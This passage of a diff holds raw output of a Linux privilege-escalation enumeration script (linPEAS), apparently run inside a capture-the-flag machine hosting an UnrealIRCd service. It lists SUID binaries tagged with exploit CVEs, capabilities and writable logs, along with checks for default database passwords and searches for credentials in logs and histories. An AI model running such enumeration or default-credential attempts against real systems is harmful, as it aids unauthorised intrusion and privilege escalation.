+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+
+[+] Login now
+ 05:17:32 up  1:37,  1 user,  load average: 0.41, 0.17, 0.18
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+
+wtmp begins Sun Sep  6 03:45:51 2020
+
+[+] Last time logon each user
+Username         Port     From             Latest
+djmardov         pts/1    10.33.3.3        Tue May 15 08:56:32 -0400 2018
+
+[+] Password policy
+PASS_MAX_DAYS	99999
+PASS_MIN_DAYS	0
+PASS_WARN_AGE	7
+ENCRYPT_METHOD SHA512
+
+[+] User timers
+ Not Found
+
+===================================( Software Information )===================================
+[+] MySQL version
+mysql Not Found
+
+[+] MySQL connection using default root/root ........... No
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Looking for mysql credentials and exec
+ Not Found
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] PostgreSQL connection to template0 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template1 using postgres/NOPASS ........ No
+[+] PostgreSQL connection to template0 using pgsql/NOPASS ........... No
+[+] PostgreSQL connection to template1 using pgsql/NOPASS ........... No
+
+[+] Apache server info
+Version: Server version: Apache/2.4.10 (Debian)
+Server built:   Mar 31 2018 10:14:07
+
+[+] Looking for PHPCookies
+ Not Found
+
+[+] Looking for Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Looking for Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+ Not Found
+
+[+] Looking for supervisord configuration file
+supervisord.conf Not Found
+
+[+] Looking for cesi configuration file
+cesi.conf Not Found
+
+[+] Looking for Rsyncd config file
+rsyncd.conf Not Found
+[+] Looking for Hostapd config file
+hostapd.conf Not Found
+
+[+] Looking for wifi conns file
+/etc/NetworkManager/system-connections/
+/etc/NetworkManager/system-connections/Wired connection 1
+
+[+] Looking for Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Looking for .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Looking for ldap directories and their hashes
+/etc/ldap
+The password hash is from the {SSHA} to 'structural'
+
+[+] Looking for .ovpn files and credentials
+.ovpn Not Found
+
+[+] Looking for ssl/ssh files
+Port 22
+PermitRootLogin without-password
+PubkeyAuthentication yes
+PermitEmptyPasswords no
+ChallengeResponseAuthentication no
+UsePAM yes
+
+Looking inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+    GSSAPIDelegateCredentials no
+
+[+] Looking for unexpected auth lines in /etc/pam.d/sshd
+No
+
+[+] Looking for Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Looking for kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+krb5.conf Not Found
+tickets kerberos Not Found
+klist Not Found
+
+[+] Looking for Kibana yaml
+kibana.yml Not Found
+
+[+] Looking for Knock configuration
+Knock.config Not Found
+
+[+] Looking for logstash files
+ Not Found
+
+[+] Looking for elasticsearch files
+ Not Found
+
+[+] Looking for Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Looking for AD cached hahses
+cached hashes Not Found
+
+[+] Looking for screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+[+] Looking for tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Looking for Couchdb directory
+
+[+] Looking for redis.conf
+
+[+] Looking for dovecot files
+dovecot credentials Not Found
+
+[+] Looking for mosquitto.conf
+
+[+] Looking for neo4j auth file
+
+[+] Looking Cloud-Init conf file
+
+
+====================================( Interesting Files )=====================================
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
+/usr/sbin/exim4
+/usr/sbin/pppd		--->	Apple_Mac_OSX_10.4.8(05-2007)
+/usr/bin/chsh
+/usr/bin/procmail
+/usr/bin/gpasswd
+/usr/bin/newgrp		--->	HP-UX_10.20
+/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
+/usr/bin/pkexec		--->	Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+/usr/bin/X
+/usr/bin/passwd		--->	Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+/usr/bin/chfn		--->	SuSE_9.3/10
+/usr/bin/viewuser
+/sbin/mount.nfs
+/bin/su
+/bin/mount		--->	Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+/bin/fusermount
+/bin/ntfs-3g		--->	Debian9/8/7/Ubuntu/Gentoo/others/Ubuntu_Server_16.10_and_others(02-2017)
+/bin/umount		--->	BSD/Linux(08-1996)
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+/usr/lib/evolution/camel-lock-helper-1.2
+/usr/lib/libvte-2.90-9/gnome-pty-helper
+/usr/lib/libvte-2.91-0/gnome-pty-helper
+/usr/lib/utempter/utempter
+/usr/bin/wall
+/usr/bin/lockfile
+/usr/bin/procmail
+/usr/bin/at		--->	RTru64_UNIX_4.0g(CVE-2002-1614)
+/usr/bin/expiry
+/usr/bin/bsd-write
+/usr/bin/mutt_dotlock
+/usr/bin/ssh-agent
+/usr/bin/dotlockfile
+/usr/bin/crontab
+/usr/bin/X
+/usr/bin/mlocate
+/usr/bin/chage
+/sbin/unix_chkpwd
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/arping = cap_net_raw+ep
+/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
+/bin/ping = cap_net_raw+ep
+/bin/ping6 = cap_net_raw+ep
+
+[+] Users with capabilities
+/etc/security/capability.conf Not Found
+
+[+] .sh files in path
+/usr/bin/gettext.sh
+
+[+] Files (scripts) in /etc/profile.d/
+total 28
+drwxr-xr-x   2 root root  4096 May 11  2018 .
+drwxr-xr-x 135 root root 12288 Oct 30  2018 ..
+-rw-r--r--   1 root root   663 Mar 22  2014 bash_completion.sh
+-rw-r--r--   1 root root  1940 Dec  5  2014 vte-2.91.sh
+-rw-r--r--   1 root root  1881 Jun 23  2014 vte.sh
+
+[+] Hashes inside passwd file? ........... No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read root folder? .............. No
+
+[+] Looking for root files in home dirs (limit 20)
+/home
+/home/djmardov/.bash_history
+
+[+] Looking for others files in folders owned by me
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins
+/var/log/auth.log
+/var/log/syslog
+/var/log/daemon.log
+/home/ircd/.gnupg/gpg.conf
+/home/ircd/.gnupg/trustdb.gpg
+/home/ircd/.gnupg/pubring.gpg
+
+[+] Writable log files (logrotten)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+Writable: /home/ircd/Unreal3.2/ircd.log
+Writable: /home/ircd/Unreal3.2/config.log
+Writable: /home/ircd/Unreal3.2/extras/c-ares-1.6.0/config.log
+Writable: /home/ircd/Unreal3.2/extras/tre-0.7.5/config.log
+
+[+] Files inside /home/ircd (limit 20)
+total 24
+drwxr-xr-x  4 ircd root 4096 Sep  6 05:16 .
+drwxr-xr-x  4 root root 4096 May 14  2018 ..
+-rw-------  1 ircd ircd  333 May 15  2018 .bash_history
+-rw-r--r--  1 ircd ircd    0 May 14  2018 .bashrc
+drwx------  2 ircd ircd 4096 Sep  6 05:16 .gnupg
+-rw-r--r--  1 ircd ircd   66 May 14  2018 .selected_editor
+drwx------ 13 ircd ircd 4096 Sep  6 03:40 Unreal3.2
+
+[+] Files inside others home (limit 20)
+/home/djmardov/.profile
+/home/djmardov/Documents/user.txt
+/home/djmardov/Documents/.backup
+/home/djmardov/.ICEauthority
+/home/djmardov/.bash_logout
+/home/djmardov/.bashrc
+
+[+] Looking for installed mail applications
+exim
+sendmail
+
+[+] Mails (limit 50)
+
+[+] Backup files?
+-rw-r--r-- 1 root root 267 May 11  2018 /var/lib/sgml-base/supercatalog.old
+-rw-r--r-- 1 root root 26450 Nov  3  2018 /var/log/Xorg.0.log.old
+-rw-r--r-- 1 root root 10701 May 11  2018 /var/www/index.old
+-rw-r--r-- 1 root root 1219 May 11  2018 /etc/xml/sgml-data.xml.old
+-rw-r--r-- 1 root root 3557 May 11  2018 /etc/xml/catalog.old
+-rw-r--r-- 1 root root 673 May 11  2018 /etc/xml/xml-core.xml.old
+-rw-r--r-- 1 root root 10151 May 11  2018 /etc/xml/docbook-xml.xml.old
+-rw-r--r-- 1 root root 339 May 11  2018 /etc/xml/docutils-common.xml.old
+-rw-r--r-- 1 root root 20 Feb 13  2015 /etc/vmware-tools/tools.conf.old
+-rw------- 1 ircd ircd 262254 Jul  3  2004 /home/ircd/Unreal3.2/Changes.old
+-rw------- 1 ircd ircd 497046 May 14  2018 /home/ircd/Unreal3.2/extras/tre.tar.gz.bak
+-rw------- 1 ircd ircd 467747 May 14  2018 /home/ircd/Unreal3.2/extras/c-ares.tar.gz.bak
+-rw-r--r-- 1 djmardov djmardov 52 May 16  2018 /home/djmardov/Documents/.backup
+
+[+] Looking for tables inside readable .db/.sqlite files (limit 100)
+ -> Extracting tables from /var/lib/colord/mapping.db (limit 20)
+
+ -> Extracting tables from /var/lib/colord/storage.db (limit 20)
+
+ -> Extracting tables from /var/lib/apt/listchanges.db (limit 20)
+ -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)
+
+
+[+] Web files?(output limit)
+/var/www/:
+total 24K
+drwxr-xr-x  3 root root 4.0K May 14  2018 .
+drwxr-xr-x 13 root root 4.0K May 11  2018 ..
+drwxr-xr-x  2 root root 4.0K May 15  2018 html
+-rw-r--r--  1 root root  11K May 11  2018 index.old
+
+/var/www/html:
+total 48K
+drwxr-xr-x 2 root root 4.0K May 15  2018 .
+
+[+] Readable *_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .gitconfig, .git-credentials, .git, .svn, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+-rw-r--r-- 1 root root 1863 Nov  5  2016 /etc/bash.bashrc
+-rw-r--r-- 1 root root 675 Nov  5  2016 /etc/skel/.profile
+-rw-r--r-- 1 root root 3515 Nov  5  2016 /etc/skel/.bashrc
+-rw------- 1 ircd ircd 333 May 15  2018 /home/ircd/.bash_history
+Looking for possible passwords inside /home/ircd/.bash_history
+sudo -i
+
+-rw-r--r-- 1 ircd ircd 0 May 14  2018 /home/ircd/.bashrc
+-rw-r--r-- 1 djmardov djmardov 675 May 11  2018 /home/djmardov/.profile
+lrwxrwxrwx 1 root root 9 Nov  3  2018 /home/djmardov/.bash_history -> /dev/null
+Looking for possible passwords inside /home/djmardov/.bash_history
+
+-rw-r--r-- 1 djmardov djmardov 3515 May 11  2018 /home/djmardov/.bashrc
+-rw-r--r-- 1 root root 870 May 15  2012 /usr/share/doc/adduser/examples/adduser.local.conf.examples/bash.bashrc
+-rw-r--r-- 1 root root 1865 May 15  2012 /usr/share/doc/adduser/examples/adduser.local.conf.examples/skel/dot.bashrc
+-rw-r--r-- 1 root root 570 Jan 31  2010 /usr/share/base-files/dot.bashrc
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r-- 1 root root 29 May 11  2018 /usr/lib/pymodules/python2.7/.path
+-rw-r--r-- 1 root root 2396 Apr  4  2018 /usr/lib/jvm/.java-1.7.0-openjdk-i386.jinfo
+-rw-r--r-- 1 root root 0 May 11  2018 /etc/.java/.systemPrefs/.systemRootModFile
+-rw-r--r-- 1 root root 0 May 11  2018 /etc/.java/.systemPrefs/.system.lock
+-rw------- 1 root root 0 May 11  2018 /etc/.pwd.lock
+-rw-r--r-- 1 root root 220 Nov  5  2016 /etc/skel/.bash_logout
+-rw------- 1 Debian-gdm Debian-gdm 5274 Sep  6 03:40 /var/lib/gdm3/.ICEauthority
+-r--r--r-- 1 root root 11 Sep  6 03:40 /tmp/.X0-lock
+-rw-r--r-- 1 root root 0 Sep  6 03:40 /run/network/.ifstate.lock
+-rw------- 1 ircd ircd 124 Apr 24  2004 /home/ircd/Unreal3.2/.cvsignore
+-rw------- 1 ircd ircd 932 Apr 13  2009 /home/ircd/Unreal3.2/.CHANGES.NEW
+-rw------- 1 ircd ircd 5623 Apr 13  2009 /home/ircd/Unreal3.2/.RELEASE.NOTES
+-rw------- 1 ircd ircd 2791 Apr 24  2004 /home/ircd/Unreal3.2/.bugreport.gdb
+-rw------- 1 ircd ircd 1645 Apr 24  2004 /home/ircd/Unreal3.2/.CONFIG.RANT
+-rw------- 1 ircd ircd 2 Apr 24  2004 /home/ircd/Unreal3.2/keys/.KEYS
+-rw------- 1 ircd ircd 519 Dec 10  2000 /home/ircd/Unreal3.2/.UPDATE
+-rw------- 1 ircd ircd 1060 Apr 24  2004 /home/ircd/Unreal3.2/.SICI
+-rw------- 1 ircd ircd 794 Aug 20  2000 /home/ircd/Unreal3.2/.indent.pro
+-rw-r--r-- 1 ircd ircd 66 May 14  2018 /home/ircd/.selected_editor
+-rw-r--r-- 1 djmardov djmardov 52 May 16  2018 /home/djmardov/Documents/.backup
+-rw------- 1 djmardov djmardov 4706 Nov  3  2018 /home/djmardov/.ICEauthority
+-rw-r--r-- 1 djmardov djmardov 220 May 11  2018 /home/djmardov/.bash_logout
+
+[+] Readable files inside /tmp, /var/tmp, /var/backups(limit 70)
+-r--r--r-- 1 root root 11 Sep  6 03:40 /tmp/.X0-lock
+-rwx------ 1 ircd ircd 159864 Mar 23 09:40 /tmp/linpeas.sh
+-rwx------ 1 ircd ircd 34374 Mar 23 09:41 /tmp/lse.sh
+-rw-r--r-- 1 root root 88342 Oct 30  2018 /var/backups/apt.extended_states.0
+-rw-r--r-- 1 root root 245 May 11  2018 /var/backups/dpkg.statoverride.2.gz
+-rw-r--r-- 1 root root 1745379 Oct 30  2018 /var/backups/dpkg.status.0
+-rw-r--r-- 1 root root 245 May 11  2018 /var/backups/dpkg.statoverride.6.gz
+-rw-r--r-- 1 root root 9890 May 15  2018 /var/backups/apt.extended_states.1.gz
+-rw-r--r-- 1 root root 318 May 11  2018 /var/backups/dpkg.diversions.6.gz
+-rw-r--r-- 1 root root 318 May 11  2018 /var/backups/dpkg.diversions.4.gz
+-rw-r--r-- 1 root root 493551 Oct 30  2018 /var/backups/dpkg.status.3.gz
+-rw-r--r-- 1 root root 245 May 11  2018 /var/backups/dpkg.statoverride.3.gz
+-rw-r--r-- 1 root root 491825 May 15  2018 /var/backups/dpkg.status.6.gz
+-rw-r--r-- 1 root root 318 May 11  2018 /var/backups/dpkg.diversions.3.gz
+-rw-r--r-- 1 root root 493551 Oct 30  2018 /var/backups/dpkg.status.1.gz
+-rw-r--r-- 1 root root 318 May 11  2018 /var/backups/dpkg.diversions.2.gz
+-rw-r--r-- 1 root root 245 May 11  2018 /var/backups/dpkg.statoverride.4.gz
+-rw-r--r-- 1 root root 245 May 11  2018 /var/backups/dpkg.statoverride.5.gz
+-rw-r--r-- 1 root root 983 May 11  2018 /var/backups/dpkg.diversions.0
+-rw-r--r-- 1 root root 318 May 11  2018 /var/backups/dpkg.diversions.1.gz
+-rw-r--r-- 1 root root 9727 May 11  2018 /var/backups/apt.extended_states.3.gz
+-rw-r--r-- 1 root root 493551 Oct 30  2018 /var/backups/dpkg.status.2.gz
+-rw-r--r-- 1 root root 318 May 11  2018 /var/backups/dpkg.diversions.5.gz
+-rw-r--r-- 1 root root 102400 May 11  2018 /var/backups/alternatives.tar.0
+-rw-r--r-- 1 root root 378 May 11  2018 /var/backups/dpkg.statoverride.0
+-rw-r--r-- 1 root root 9868 May 11  2018 /var/backups/apt.extended_states.2.gz
+-rw-r--r-- 1 root root 493551 Oct 30  2018 /var/backups/dpkg.status.4.gz
+-rw-r--r-- 1 root root 245 May 11  2018 /var/backups/dpkg.statoverride.1.gz
+-rw-r--r-- 1 root root 491825 May 15  2018 /var/backups/dpkg.status.5.gz
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/mqueue
+/dev/mqueue/linpeas.txt
+/dev/shm
+/dev/shm/linpeas.txt
+/home/ircd
+/run/lock
+/run/user/1001
+/run/user/1001/systemd
+/tmp
+/tmp/.font-unix
+/tmp/.ICE-unix
+/tmp/linpeas.sh
+/tmp/lse.sh
+/tmp/.Test-unix
+/tmp/.X11-unix
+/tmp/.XIM-unix
+/var/tmp
+
+[+] Interesting GROUP writable files (not in Home)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group ircd:
+
+[+] Searching passwords in config PHP files
+
+[+] Finding IPs inside logs (limit 70)
+      3 /var/log/Xorg.1.log:1.15.99.90
+      3 /var/log/installer/status:1.2.3.3
+      1 /var/log/lastlog:10.33.3.3
+
+[+] Finding passwords inside logs (limit 70)
+/var/log/installer/status:Description: Set up users and passwords
+
+[+] Finding emails inside logs (limit 70)
+     43 /var/log/installer/status:debian-boot@lists.debian.org
+     16 /var/log/installer/status:debian-kernel@lists.debian.org
+      3 /var/log/installer/status:gcs@debian.org
+      2 /var/log/installer/status:remi@remlab.net
+      2 /var/log/installer/status:pkg-lvm-maintainers@lists.alioth.debian.org
+      2 /var/log/installer/status:parted-maintainers@lists.alioth.debian.org
+      2 /var/log/installer/status:mmind@debian.org
+      2 /var/log/installer/status:debian-glibc@lists.debian.org
+      2 /var/log/installer/status:ah-util-linux@debian.org
+      1 /var/log/installer/status:xnox@debian.org
+      1 /var/log/installer/status:xfs@oss.sgi.com
+      1 /var/log/installer/status:tytso@mit.edu
+      1 /var/log/installer/status:racke@linuxia.de
+      1 /var/log/installer/status:pkg-wpa-devel@lists.alioth.debian.org
+      1 /var/log/installer/status:pkg-openssl-devel@lists.alioth.debian.org
+      1 /var/log/installer/status:pkg-mdadm-devel@lists.alioth.debian.org
+      1 /var/log/installer/status:pkg-iscsi-maintainers@lists.alioth.debian.org
+      1 /var/log/installer/status:pkg-grub-devel@lists.alioth.debian.org
+      1 /var/log/installer/status:pkg-gnupg-maint@lists.alioth.debian.org
+      1 /var/log/installer/status:petere@debian.org
+      1 /var/log/installer/status:packages@release.debian.org
+      1 /var/log/installer/status:jcorbier@debian.org
+      1 /var/log/installer/status:guus@debian.org
+      1 /var/log/installer/status:guillem@debian.org
+      1 /var/log/installer/status:djpig@debian.org
+      1 /var/log/installer/status:anibal@debian.org
+      1 /var/log/installer/status:aeb@debian.org
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding 'pwd' or 'passw' variables inside /home /var/www /var/backups /tmp /etc /root /mnt (limit 70)
+f^C
